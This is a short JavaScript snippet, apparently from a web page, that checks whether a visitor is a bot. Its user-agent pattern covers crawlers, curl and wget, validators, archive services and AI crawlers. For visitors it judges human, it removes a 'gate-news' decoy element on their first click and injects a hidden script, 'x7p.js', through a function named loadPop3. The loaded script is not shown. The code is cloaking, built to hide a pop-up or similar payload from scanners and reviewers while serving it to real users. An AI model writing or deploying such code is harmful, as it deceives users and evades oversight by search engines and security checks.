(function () {
  var loaded = false;

  function isLikelyBot() {
    if (navigator.webdriver) return true;

    var ua = (navigator.userAgent || "").toLowerCase();
    var botPattern =
      /bot|crawl|spider|slurp|headless|phantom|scrapy|curl|wget|python-requests|httpclient|java\/|libwww|go-http|axios|node-fetch|googlebot|google-inspectiontool|bingbot|yandex|baiduspider|duckduckbot|applebot|facebookbot|facebookexternalhit|facebot|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|slackbot|pinterest|semrush|ahrefs|mj12bot|dotbot|petalbot|bytespider|gptbot|claudebot|anthropic|ia_archiver|archive\.org|mediapartners|adsbot|lighthouse|pagespeed|pingdom|uptimerobot|validator|preview|prerender|screaming frog/i;

    if (botPattern.test(ua)) return true;
    if (!window.requestAnimationFrame || !window.matchMedia) return true;

    return false;
  }

  function loadPop3() {
    if (loaded || isLikelyBot()) return;

    loaded = true;
    document.body.classList.remove("gate-pending");

    var news = document.getElementById("gate-news");
    if (news) news.remove();

    var script = document.createElement("script");
    script.src = "x7p.js?v=16";
    document.body.appendChild(script);
  }

  function onHumanClick() {
    if (isLikelyBot()) return;
    loadPop3();
  }

  document.addEventListener("click", onHumanClick, true);
  document.addEventListener("touchstart", onHumanClick, { capture: true, passive: true });
})();
